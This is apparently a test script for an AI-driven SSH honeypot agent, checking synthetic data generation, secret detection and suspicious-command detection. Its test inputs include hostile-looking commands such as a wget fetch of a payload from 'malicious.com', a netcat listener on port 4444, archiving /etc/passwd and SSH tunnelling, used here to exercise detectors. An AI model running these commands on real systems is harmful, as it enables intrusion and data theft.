#!/usr/bin/env python3
"""
Test script for Interaction Agent implementation
Tests the AI-powered interaction engine, synthetic data generation, and security controls.
"""

import asyncio
import json
import logging
import os
import sys
from datetime import datetime

# Add current directory to Python path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Set environment variables for testing (AgentCore Runtime, not Bedrock)
os.environ["AGENTCORE_RUNTIME"] = "false"  # Use mock AI for local testing
os.environ["USE_MOCK_AI"] = "true"

async def test_interaction_agent():
    """Test the Interaction Agent functionality"""
    try:
        from agents.interaction import InteractionAgent, SyntheticDataGenerator, SecurityControls
        
        logger.info("Testing Interaction Agent implementation...")
        
        # Test 1: Initialize Interaction Agent
        logger.info("1. Testing Interaction Agent initialization...")
        config = {
            "max_sessions": 10,
            "session_timeout": 1800,
            "security_level": "high"
        }
        
        agent = InteractionAgent(config)
        await agent.start()
        logger.info("✓ Interaction Agent initialized successfully")
        
        # Test 2: Test synthetic data generation
        logger.info("2. Testing synthetic data generation...")
        synthetic_gen = SyntheticDataGenerator()
        
        # Generate synthetic credentials
        credentials = synthetic_gen.generate_synthetic_credentials(3)
        logger.info(f"✓ Generated {len(credentials)} synthetic credentials")
        for cred in credentials:
            logger.info(f"  - {cred['username']}:{cred['password']} (Role: {cred['role']})")
        
        # Generate command output
        command_output = synthetic_gen.generate_command_output("ls -la")
        logger.info(f"✓ Generated command output: {command_output[:100]}...")
        
        # Generate synthetic files
        files = synthetic_gen.generate_synthetic_files(5)
        logger.info(f"✓ Generated {len(files)} synthetic files")
        
        # Test 3: Test security controls
        logger.info("3. Testing security controls...")
        security = SecurityControls()
        
        # Test real data detection
        test_inputs = [
            "password=myRealPassword123",  # Should trigger
            "synthetic_password=test123",  # Should not trigger
            "api_key=sk-1234567890abcdef",  # Should trigger
            "normal command input"  # Should not trigger
        ]
        
        for test_input in test_inputs:
            result = await security.detect_real_data(test_input)
            logger.info(f"  Input: '{test_input}' -> Real data detected: {result['real_data_detected']}")
        
        # Test suspicious activity detection
        suspicious_inputs = [
            "ssh -L 8080:internal-server:22",  # Lateral movement
            "tar -czf backup.tar.gz /etc/passwd",  # Data exfiltration
            "ls /home/admin"  # Normal command
        ]
        
        for sus_input in suspicious_inputs:
            result = await security.analyze_suspicious_activity(sus_input, {})
            logger.info(f"  Input: '{sus_input}' -> Suspicious: {result['suspicious_activity_detected']}")
        
        # Test 4: Test interaction session
        logger.info("4. Testing interaction session...")
        
        # Start a session
        start_message = {
            "type": "start_interaction",
            "honeypot_type": "ssh",
            "attacker_ip": "192.168.1.100"
        }
        
        session_result = await agent.process_message(start_message)
        session_id = session_result["session_id"]
        logger.info(f"✓ Started session {session_id}")
        logger.info(f"  Initial response: {session_result['initial_response']}")
        
        # Test attacker inputs
        test_interactions = [
            "whoami",
            "ls -la",
            "cat /etc/passwd",
            "sudo su -",
            "password=admin123"  # Should trigger security
        ]
        
        for interaction in test_interactions:
            input_message = {
                "type": "attacker_input",
                "session_id": session_id,
                "input": interaction
            }
            
            try:
                response = await agent.process_message(input_message)
                if "error" in response:
                    logger.info(f"  Input: '{interaction}' -> Error: {response['error']}")
                elif "escalation" in response:
                    logger.info(f"  Input: '{interaction}' -> ESCALATED: {response['escalation']['escalation_type']}")
                else:
                    logger.info(f"  Input: '{interaction}' -> Response: {response['response'][:100]}...")
            except Exception as e:
                logger.error(f"  Input: '{interaction}' -> Exception: {e}")
        
        # Test 5: Test agent tools
        logger.info("5. Testing agent tools...")
        
        # Test health check
        health = agent.health_check_tool()
        logger.info(f"✓ Health check: {health['status']}")
        
        # Test active sessions
        sessions = agent.get_active_sessions_tool()
        logger.info(f"✓ Active sessions: {sessions['active_sessions_count']}")
        
        # Test security status
        security_status = agent.get_security_status_tool()
        logger.info(f"✓ Security status: {security_status}")
        
        # Test synthetic data validation
        test_data = {"username": "test", "synthetic_marker": "SYNTHETIC_DATA"}
        is_valid = agent.validate_synthetic_data_tool(test_data)
        logger.info(f"✓ Synthetic data validation: {is_valid}")
        
        # Test 6: Test metrics
        logger.info("6. Testing metrics...")
        metrics = await agent.get_metrics()
        logger.info(f"✓ Agent metrics: {json.dumps(metrics, indent=2)}")
        
        # Cleanup
        await agent.stop()
        logger.info("✓ Agent stopped successfully")
        
        logger.info("All tests completed successfully!")
        
    except Exception as e:
        logger.error(f"Test failed: {e}")
        import traceback
        traceback.print_exc()

async def test_synthetic_data_generator():
    """Test synthetic data generator independently"""
    logger.info("Testing Synthetic Data Generator...")
    
    from agents.interaction.synthetic_data_generator import SyntheticDataGenerator
    gen = SyntheticDataGenerator()
    
    # Test various data generation
    logger.info("Testing credential generation...")
    creds = gen.generate_synthetic_credentials(5)
    for cred in creds:
        logger.info(f"  {cred['username']}:{cred['password']} ({cred['role']})")
    
    logger.info("Testing command outputs...")
    commands = ["ls", "ps aux", "netstat -an", "whoami", "pwd"]
    for cmd in commands:
        output = gen.generate_command_output(cmd)
        logger.info(f"  {cmd}: {output[:50]}...")
    
    logger.info("Testing file generation...")
    files = gen.generate_synthetic_files(3)
    for file in files:
        logger.info(f"  {file['filename']} ({file['size']} bytes)")
    
    logger.info("Testing network simulation...")
    network = gen.generate_network_simulation("firewall")
    logger.info(f"  Network: {network['type']} - {network['status']}")
    
    logger.info("Synthetic Data Generator tests completed!")

async def test_security_controls():
    """Test security controls independently"""
    logger.info("Testing Security Controls...")
    
    from agents.interaction.security_controls import SecurityControls
    security = SecurityControls()
    
    # Test real data detection
    logger.info("Testing real data detection...")
    test_cases = [
        "password=secretPassword123",
        "api_key=sk-abcdef1234567890",
        "ssn=123-45-6789",
        "email=user@company.com",
        "normal text input"
    ]
    
    for case in test_cases:
        result = await security.detect_real_data(case)
        logger.info(f"  '{case}' -> Detected: {result['real_data_detected']} (Score: {result['confidence_score']:.2f})")
    
    # Test suspicious activity
    logger.info("Testing suspicious activity detection...")
    suspicious_cases = [
        "ssh -L 8080:internal:22 user@server",
        "wget http://malicious.com/payload.sh",
        "crontab -e",
        "sudo su - root",
        "ls /home/user"
    ]
    
    for case in suspicious_cases:
        result = await security.analyze_suspicious_activity(case, {})
        logger.info(f"  '{case}' -> Suspicious: {result['suspicious_activity_detected']} (Level: {result['threat_level']})")
    
    # Test isolation controls
    logger.info("Testing isolation controls...")
    isolation_cases = [
        "nc -l -p 4444",
        "ssh user@external.com",
        "cat /etc/passwd",
        "ls /home"
    ]
    
    for case in isolation_cases:
        result = await security.enforce_isolation(case, {})
        logger.info(f"  '{case}' -> Allowed: {result['allowed']}")
        if not result['allowed']:
            logger.info(f"    Reason: {result['blocked_reason']}")
    
    logger.info("Security Controls tests completed!")

if __name__ == "__main__":
    print("AI-Powered Honeypot Interaction Agent Test Suite")
    print("=" * 50)
    
    # Run tests
    asyncio.run(test_synthetic_data_generator())
    print()
    asyncio.run(test_security_controls())
    print()
    asyncio.run(test_interaction_agent())